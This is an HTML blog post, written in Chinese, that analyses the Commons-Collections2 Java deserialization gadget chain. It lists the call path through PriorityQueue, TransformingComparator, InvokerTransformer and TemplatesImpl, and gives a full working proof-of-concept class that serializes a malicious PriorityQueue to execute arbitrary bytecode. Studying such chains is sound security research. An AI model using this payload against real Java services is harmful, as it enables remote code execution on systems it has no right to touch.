@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Commons-Collections2 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="CC2的利用版本与CC4相同：
+CommonsCollections 4.0
+JDK 版本暂无限制
+需要 javassist(伪条件)
+
+CC2与CC4均是为ysoserial为commons-collections4准备的两条新的利用链。..." />
+    <meta name="keywords" content="cc,java,反序列化" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Commons-Collections2</h2>
+            <div class="post-date">2022-11-20</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/commons-collections2.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p><strong>CC2的利用版本与CC4相同：</strong><br>
+CommonsCollections 4.0<br>
+JDK 版本暂无限制<br>
+需要 javassist(伪条件)</p>
+<!-- more -->
+<p>CC2与CC4均是为ysoserial为commons-collections4准备的两条新的利用链。<br>
+那么老的利用链在commons-collections4中是否仍然能使用？我们将CC6的依赖包更改为commons-collections4中的依赖包进行运行。会报错，没有 <code>LazyMap.decorate()</code>方法，原因是在commons-collections4中该方法改名为<code> lazyMap()</code>。更改源码中的该方法名即可正常运行。<br>
+<img src="https://dydydy123.github.io/post-images/1668931380223.png" alt="" loading="lazy"></p>
+<p><strong>调用链：</strong></p>
+<pre><code>PriorityQueue.readObject()
+  PriorityQueue.heapify()
+  PriorityQueue.siftDown()
+  PriorityQueue.siftDownUsingComparator()
+  comparator.compare() === TransformingComparator.compare()
+    InvokerTransformer.transform()
+      TemplatesImpl.newTransformer()
+        TemplatesImpl.getTransletInstance() 
+          TemplatesImpl.defineTransletClasses()
+
+</code></pre>
+<p>可以看到与CC4的区别在于CC2直接使用了<code>InvokerTransformer.transform()</code>来执行<code>TemplatesImpl.newTransformer()</code>从而进行任意字节码执行。</p>
+<h1 id="poc">poc:</h1>
+<pre><code>package Cc2;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.PriorityQueue;
+
+public class Cc2 {
+    public static void main(String[] args) throws Exception {
+        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\class\\&quot;,&quot;Temp.class&quot;));
+        Templates obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_name&quot;, &quot;notnull&quot;);
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,null,null);
+
+
+        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));
+        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
+
+//        通过add方法来修改queue
+//        if (i == 0)
+//            queue[0] = e;只有第一次add()时才给queue[]赋值
+/**
+public int compare(final I obj1, final I obj2) {
+        final O value1 = this.transformer.transform(obj1);obj1为queue[0]，及构造的TemplatesImpl();
+        final O value2 = this.transformer.transform(obj2);
+        return this.decorated.compare(value1, value2);
+    }
+**/
+        priorityQueue.add(obj);
+        priorityQueue.add(1);
+
+
+        Field iTransformers = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(transformingComparator,invokerTransformer);
+
+        serialize(priorityQueue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+    public static void setFieldValue(Object obj,String name,Object value) throws Exception {
+        Field f = obj.getClass().getDeclaredField(name);
+        f.setAccessible(true);
+        f.set(obj, value);
+    }
+}
+
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://dydydy123.github.io/tag/H2OnWZra8/" class="tag">
+                    cc
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/-DwzpURo7/" class="tag">
+                    java
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/OtQMAvCGr3/" class="tag">
+                    反序列化
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/commons-collections4/">
+                  <h3 class="post-title">
+                    Commons-Collections4
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
